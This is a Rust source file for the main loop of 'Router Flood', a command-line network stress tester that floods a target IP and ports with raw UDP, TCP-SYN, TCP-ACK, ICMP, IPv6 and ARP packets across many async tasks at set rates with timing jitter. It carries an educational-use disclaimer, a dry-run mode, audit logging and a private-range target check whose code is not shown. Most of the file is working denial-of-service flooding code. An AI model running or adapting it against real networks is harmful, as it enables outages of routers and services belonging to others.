//! # Disclaimer
//!
//! - The software is for educational and authorized testing purposes only.
//! - Unauthorized use (especially against systems you don't own or lack explicit permission to test) is strictly prohibited and may be illegal.

use clap::{Arg, Command};
use pnet::transport::{self};
use std::net::IpAddr;
use std::time::Duration as StdDuration;
use tokio::sync::Mutex;
use tokio::time;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use tracing::{info, warn, error, debug, trace};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};


pub mod config;
use config::*;

pub mod stats;
use stats::*;

pub mod packet;
use packet::*;

pub mod monitor;
use monitor::*;

pub mod target;
use target::*;

pub mod network;
use network::*;

pub mod validation;
use validation::*;

pub mod audit;
use audit::*;



pub async fn run() {
    // Initialize enhanced logging
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| "info".into()),
        ))
        .with(tracing_subscriber::fmt::layer())
        .init();

    let matches = Command::new("Router Flood - Enhanced Network Stress Tester")
        .version(env!("CARGO_PKG_VERSION"))  // Dynamically pulls from Cargo.toml
        .about("Educational DDoS simulation for local network testing with multi-protocol support")
        .arg(
            Arg::new("target")
                .long("target")
                .short('t')
                .value_name("IP")
                .help("Target router IP (must be private range)")
                .required_unless_present_any(&["config", "list-interfaces"]),
        )
        .arg(
            Arg::new("ports")
                .long("ports")
                .short('p')
                .value_name("PORTS")
                .help("Target ports (comma-separated, e.g., 80,443,22)")
                .required_unless_present_any(&["config", "list-interfaces"]),
        )
        .arg(
            Arg::new("threads")
                .long("threads")
                .value_name("NUM")
                .help(&format!("Number of async tasks (default: 4, max: {})", MAX_THREADS))
                .default_value("4"),
        )
        .arg(
            Arg::new("rate")
                .long("rate")
                .value_name("PPS")
                .help("Packets per second per thread (default: 100)")
                .default_value("100"),
        )
        .arg(
            Arg::new("duration")
                .long("duration")
                .short('d')
                .value_name("SECONDS")
                .help("Test duration in seconds (default: unlimited)"),
        )
        .arg(
            Arg::new("config")
                .long("config")
                .short('c')
                .value_name("FILE")
                .help("YAML configuration file path"),
        )
        .arg(
            Arg::new("interface")
                .long("interface")
                .short('i')
                .value_name("NAME")
                .help("Network interface to use (default: auto-detect)"),
        )
        .arg(
            Arg::new("export")
                .long("export")
                .value_name("FORMAT")
                .help("Export statistics (json, csv, both)")
                .value_parser(["json", "csv", "both"]),
        )
        .arg(
            Arg::new("list-interfaces")
                .long("list-interfaces")
                .help("List available network interfaces")
                .action(clap::ArgAction::SetTrue),
        )
        .arg(
            Arg::new("dry-run")
                .long("dry-run")
                .help("Simulate the attack without sending actual packets (safe testing)")
                .action(clap::ArgAction::SetTrue),
        )
        .get_matches();

    // List interfaces if requested
    if matches.get_flag("list-interfaces") {
        println!("Available network interfaces:");
        for iface in list_network_interfaces() {
            println!("  {} - {} (Up: {}, IPs: {:?})",
                     iface.name,
                     iface.description,
                     iface.is_up(),
                     iface.ips);
        }
        return;
    }

    // Load configuration
    let mut config = if let Some(config_path) = matches.get_one::<String>("config") {
        match load_config(Some(config_path)) {
            Ok(config) => config,
            Err(e) => {
                error!("Failed to load config: {}", e);
                std::process::exit(1);
            }
        }
    } else {
        get_default_config()
    };

    // Override config with command line arguments
    if let Some(target) = matches.get_one::<String>("target") {
        config.target.ip = target.clone();
    }

    if let Some(ports_str) = matches.get_one::<String>("ports") {
        config.target.ports = ports_str
            .split(',')
            .map(|s| s.trim().parse().expect("Invalid port number"))
            .collect();
    }

    if let Some(threads) = matches.get_one::<String>("threads") {
        config.attack.threads = threads.parse().expect("Invalid thread count");
    }

    if let Some(rate) = matches.get_one::<String>("rate") {
        config.attack.packet_rate = rate.parse().expect("Invalid packet rate");
    }

    if let Some(duration) = matches.get_one::<String>("duration") {
        config.attack.duration = Some(duration.parse().expect("Invalid duration"));
    }

    if let Some(interface) = matches.get_one::<String>("interface") {
        config.target.interface = Some(interface.clone());
    }

    if let Some(export_format) = matches.get_one::<String>("export") {
        config.export.enabled = true;
        config.export.format = match export_format.as_str() {
            "json" => ExportFormat::Json,
            "csv" => ExportFormat::Csv,
            "both" => ExportFormat::Both,
            _ => ExportFormat::Json,
        };
    }

    // Check for dry-run mode (CLI flag or config file)
    let cli_dry_run = matches.get_flag("dry-run");
    let dry_run = cli_dry_run || config.safety.dry_run;
    if dry_run {
        config.safety.dry_run = true;
        if cli_dry_run {
            info!("🔍 DRY-RUN MODE ENABLED (CLI) - No packets will be sent");
        } else {
            info!("🔍 DRY-RUN MODE ENABLED (CONFIG) - No packets will be sent");
        }
    }

    // Parse and validate target IP
    let target_ip: IpAddr = config.target.ip.parse()
        .expect("Invalid IP format");

    // Enhanced validation
    if let Err(e) = validate_comprehensive_security(&target_ip, &config.target.ports,
                                                    config.attack.threads, config.attack.packet_rate) {
        error!("Security Validation Error: {}", e);
        std::process::exit(1);
    }

    if let Err(e) = validate_system_requirements(dry_run) {
        error!("System Requirements Error: {}", e);
        std::process::exit(1);
    }

    // Validate network interface
    let selected_interface = if let Some(iface_name) = &config.target.interface {
        match find_interface_by_name(iface_name) {
            Some(iface) => {
                info!("Using specified interface: {}", iface.name);
                Some(iface)
            },
            None => {
                error!("Interface '{}' not found", iface_name);
                std::process::exit(1);
            }
        }
    } else {
        match get_default_interface() {
            Some(iface) => {
                info!("Using default interface: {}", iface.name);
                Some(iface)
            },
            None => {
                warn!("No suitable network interface found");
                None
            }
        }
    };

    // Initialize system monitoring
    let system_monitor = SystemMonitor::new(config.monitoring.system_monitoring);

    // Initialize statistics with export config
    let export_config = if config.export.enabled {
        Some(config.export.clone())
    } else {
        None
    };
    let stats = Arc::new(FloodStats::new(export_config));

    // Create audit log entry
    if config.safety.audit_logging {
        if let Err(e) = create_audit_entry(&target_ip, &config.target.ports,
                                          config.attack.threads, config.attack.packet_rate,
                                          config.attack.duration,
                                          selected_interface.as_ref().map(|i| i.name.as_str()),
                                          &stats.session_id) {
            error!("Audit Log Error: {}", e);
            std::process::exit(1);
        }
    }

    // Create transport channels (skip in dry-run mode)
    let (tx_ipv4, tx_ipv6, tx_l2) = if !dry_run {
        let tx_ipv4 = match transport::transport_channel(
            4096,
            transport::TransportChannelType::Layer3(pnet::packet::ip::IpNextHeaderProtocols::Ipv4),
        ) {
            Ok((tx, _)) => Some(Arc::new(Mutex::new(tx))),
            Err(e) => {
                error!("Failed to create IPv4 transport channel: {}", e);
                std::process::exit(1);
            }
        };

        let tx_ipv6 = match transport::transport_channel(
            4096,
            transport::TransportChannelType::Layer3(pnet::packet::ip::IpNextHeaderProtocols::Ipv6),
        ) {
            Ok((tx, _)) => Some(Arc::new(Mutex::new(tx))),
            Err(e) => {
                error!("Failed to create IPv6 transport channel: {}", e);
                std::process::exit(1);
            }
        };

        let tx_l2 = if let Some(iface) = selected_interface.clone() {
            match pnet::datalink::channel(&iface, Default::default()) {
                Ok(pnet::datalink::Channel::Ethernet(tx, _)) => Some(Arc::new(Mutex::new(tx))),
                Ok(_) => {
                    error!("Unknown channel type for L2");
                    std::process::exit(1);
                }
                Err(e) => {
                    error!("Failed to create L2 transport channel: {}", e);
                    std::process::exit(1);
                }
            }
        } else {
            None
        };

        (tx_ipv4, tx_ipv6, tx_l2)
    } else {
        info!("Dry-run mode: Skipping transport channel creation");
        (None, None, None)
    };
    let running = Arc::new(AtomicBool::new(true));
    let multi_port_target = Arc::new(MultiPortTarget::new(config.target.ports.clone()));

    if dry_run {
        info!("🔍 Starting Enhanced Router Flood SIMULATION v3.0 (DRY-RUN)");
        info!("   ⚠️  DRY-RUN MODE: No actual packets will be sent!");
    } else {
        info!("🚀 Starting Enhanced Router Flood Simulation v3.0");
    }
    info!("   Session ID: {}", stats.session_id);
    info!("   Target: {} (Ports: {:?})", target_ip, config.target.ports);
    info!("   Threads: {}, Rate: {} pps/thread", config.attack.threads, config.attack.packet_rate);
    if let Some(d) = config.attack.duration {
        info!("   Duration: {} seconds", d);
    }
    if let Some(iface) = &selected_interface {
        info!("   Interface: {}", iface.name);
    }
    info!("   Protocols: UDP({:.0}%), TCP-SYN({:.0}%), TCP-ACK({:.0}%), ICMP({:.0}%), IPv6({:.0}%), ARP({:.0}%)",
          config.target.protocol_mix.udp_ratio * 100.0,
          config.target.protocol_mix.tcp_syn_ratio * 100.0,
          config.target.protocol_mix.tcp_ack_ratio * 100.0,
          config.target.protocol_mix.icmp_ratio * 100.0,
          config.target.protocol_mix.ipv6_ratio * 100.0,
          config.target.protocol_mix.arp_ratio * 100.0);
    if dry_run {
        info!("   📋 Mode: SIMULATION ONLY - Safe for testing configurations");
    }
    info!("   Press Ctrl+C to stop gracefully");
    println!();

    // Spawn statistics reporter with system monitoring
    let stats_clone = stats.clone();
    let running_clone = running.clone();
    let system_monitor_clone = system_monitor;
    let stats_interval = config.monitoring.stats_interval;
    tokio::spawn(async move {
        while running_clone.load(Ordering::Relaxed) {
            time::sleep(StdDuration::from_secs(stats_interval)).await;
            let sys_stats = system_monitor_clone.get_system_stats().await;
            stats_clone.print_stats(sys_stats.as_ref());
        }
    });

    // Spawn export task if enabled
    if config.export.enabled {
        if let Some(export_interval) = config.monitoring.export_interval {
            let stats_clone = stats.clone();
            let running_clone = running.clone();
            tokio::spawn(async move {
                while running_clone.load(Ordering::Relaxed) {
                    time::sleep(StdDuration::from_secs(export_interval)).await;
                    if let Err(e) = stats_clone.export_stats(None).await {
                        error!("Failed to export stats: {}", e);
                    }
                }
            });
        }
    }

    // Set duration timer if specified
    if let Some(duration_secs) = config.attack.duration {
        let running_clone = running.clone();
        tokio::spawn(async move {
            time::sleep(StdDuration::from_secs(duration_secs)).await;
            running_clone.store(false, Ordering::Relaxed);
            info!("⏰ Duration reached, stopping...");
        });
    }

    // Spawn flood tasks
    let mut handles = vec![];
    for task_id in 0..config.attack.threads {
        let tx_ipv4_clone = tx_ipv4.clone();
        let tx_ipv6_clone = tx_ipv6.clone();
        let tx_l2_clone = tx_l2.clone();
        let stats_clone = stats.clone();
        let running_clone = running.clone();
        let multi_port_target_clone = multi_port_target.clone();
        let packet_rate = config.attack.packet_rate;
        let packet_size_range = config.attack.packet_size_range;
        let protocol_mix = config.target.protocol_mix.clone();
        let randomize_timing = config.attack.randomize_timing;
        let dry_run_mode = dry_run;

        let handle = tokio::spawn(async move {
            let mut packet_builder = PacketBuilder::new(packet_size_range, protocol_mix);
            let base_delay = StdDuration::from_nanos(1_000_000_000 / packet_rate);

            while running_clone.load(Ordering::Relaxed) {
                let current_port = multi_port_target_clone.next_port();
                let packet_type = packet_builder.next_packet_type();

                let packet_result = packet_builder.build_packet(packet_type, target_ip, current_port);

                let (packet_data, protocol_name) = match packet_result {
                    Ok(data) => data,
                    Err(e) => {
                        if task_id == 0 {
                            debug!("Failed to build packet: {}", e);
                        }
                        stats_clone.increment_failed();
                        continue;
                    }
                };

                // Send packet (or simulate in dry-run mode)
                if dry_run_mode {
                    // Simulate packet sending with artificial success/failure rate
                    let simulate_success = packet_builder.rng_gen_bool(0.98); // 98% success rate simulation
                    if simulate_success {
                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
                        if task_id == 0 && stats_clone.packets_sent.load(Ordering::Relaxed) % 1000 == 0 {
                            trace!("[DRY-RUN] Simulated {} packet to {}:{} (size: {} bytes)",
                                  protocol_name, target_ip, current_port, packet_data.len());
                        }
                    } else {
                        stats_clone.increment_failed();
                    }
                } else {
                    // Real packet sending
                    match packet_type {
                        PacketType::Udp | PacketType::TcpSyn | PacketType::TcpAck | PacketType::Icmp => {
                            if let Some(ref tx_ref) = tx_ipv4_clone {
                                let mut tx_guard = tx_ref.lock().await;
                                match tx_guard.send_to(pnet::packet::ipv4::Ipv4Packet::new(&packet_data).unwrap(), target_ip) {
                                    Ok(_) => {
                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
                                    },
                                    Err(e) => {
                                        if task_id == 0 {
                                            trace!("Failed to send packet: {}", e);
                                        }
                                        stats_clone.increment_failed();
                                    }
                                }
                                drop(tx_guard);
                            }
                        }
                        PacketType::Ipv6Udp | PacketType::Ipv6Tcp | PacketType::Ipv6Icmp => {
                            if let Some(ref tx_ref) = tx_ipv6_clone {
                                let mut tx_guard = tx_ref.lock().await;
                                match tx_guard.send_to(pnet::packet::ipv6::Ipv6Packet::new(&packet_data).unwrap(), target_ip) {
                                    Ok(_) => {
                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
                                    },
                                    Err(e) => {
                                        if task_id == 0 {
                                            trace!("Failed to send packet: {}", e);
                                        }
                                        stats_clone.increment_failed();
                                    }
                                }
                                drop(tx_guard);
                            }
                        }
                        PacketType::Arp => {
                            if let Some(ref tx_ref) = tx_l2_clone {
                                let mut tx_guard = tx_ref.lock().await;
                                match tx_guard.send_to(&packet_data, None) {
                                    Some(Ok(_)) => {
                                        stats_clone.increment_sent(packet_data.len() as u64, protocol_name);
                                    },
                                    Some(Err(e)) => {
                                        if task_id == 0 {
                                            trace!("Failed to send packet: {}", e);
                                        }
                                        stats_clone.increment_failed();
                                    }
                                    None => {
                                        if task_id == 0 {
                                            trace!("Failed to send packet: No L2 sender");
                                        }
                                        stats_clone.increment_failed();
                                    }
                                }
                                drop(tx_guard);
                            }
                        }
                    }
                }

                // Randomized timing if enabled
                let delay = if randomize_timing {
                    let jitter = packet_builder.rng_gen_range(0.8..1.2);
                    StdDuration::from_nanos((base_delay.as_nanos() as f64 * jitter) as u64)
                } else {
                    base_delay
                };

                time::sleep(delay).await;
            }
        });
        handles.push(handle);
    }

    // Set up graceful shutdown
    tokio::select! {
        _ = tokio::signal::ctrl_c() => {
            info!("🛑 Received Ctrl+C, shutting down gracefully...");
            running.store(false, Ordering::Relaxed);
        }
        _ = async {
            for handle in handles {
                handle.await.unwrap();
            }
        } => {}
    }

    // Final statistics and export
    time::sleep(StdDuration::from_millis(100)).await;
    if dry_run {
        info!("📈 Final Simulation Statistics (DRY-RUN):");
    } else {
        info!("📈 Final Statistics:");
    }
    stats.print_stats(None);

    // Final export if enabled
    if config.export.enabled {
        if let Err(e) = stats.export_stats(None).await {
            error!("Failed to export final stats: {}", e);
        }
    }

    if dry_run {
        info!("✅ Simulation completed successfully (NO PACKETS SENT)");
        info!("📋 Dry-run mode: Configuration validated, packet generation tested");
    } else {
        info!("✅ Simulation completed successfully");
    }
}
